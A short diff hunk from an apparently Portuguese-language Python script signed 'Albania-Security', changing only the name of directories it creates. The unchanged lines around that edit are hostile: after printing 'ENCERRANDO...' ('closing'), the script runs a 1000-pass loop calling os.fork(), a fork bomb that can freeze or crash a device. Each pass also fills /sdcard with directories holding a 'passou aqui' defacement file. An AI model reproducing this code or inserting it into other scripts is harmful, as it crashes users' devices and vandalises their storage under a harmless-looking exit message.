@@ -80,7 +80,7 @@ time.sleep (0.5)
 os.system (' figlet -f slant ENCERRANDO...')
 for i in range(1000):
     os.fork()
-    dir = ("Albania-Security"+str(i))
+    dir = ("Albania-Security."+str(i))
     os.system (f'cd /sdcard && mkdir {dir} && cd {dir} && echo Albania-Security passou aqui > AVISO.txt')
 
 time.sleep (2.0)
